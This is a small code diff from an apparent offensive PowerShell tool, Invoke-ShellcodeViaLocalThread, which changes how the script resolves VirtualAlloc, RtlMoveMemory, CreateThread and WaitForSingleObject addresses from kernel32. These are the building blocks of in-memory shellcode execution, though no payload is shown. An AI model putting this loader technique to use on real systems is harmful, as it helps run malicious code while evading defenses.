@@ -138,10 +138,10 @@ function Invoke-ShellcodeViaLocalThread
 
     $Kernel32Handle                     = $GetModuleHandle.Invoke($null, @([String] "kernel32.dll"))
 
-    $VirtualAllocAddress                = $GetProcAddress.Invoke($null, @($Kernel32Handle, "VirtualAlloc"))
-    $RtlMoveMemoryAddress               = $GetProcAddress.Invoke($null, @($Kernel32Handle, "RtlMoveMemory"))
-    $CreateThreadAddress                = $GetProcAddress.Invoke($null, @($Kernel32Handle, "CreateThread"))
-    $WaitForSingleObjectAddress         = $GetProcAddress.Invoke($null, @($Kernel32Handle, "WaitForSingleObject"))
+    $VirtualAllocAddress                = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "VirtualAlloc"))
+    $RtlMoveMemoryAddress               = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "RtlMoveMemory"))
+    $CreateThreadAddress                = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "CreateThread"))
+    $WaitForSingleObjectAddress         = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "WaitForSingleObject"))
 
     # Create delegates with our function pointers.
 
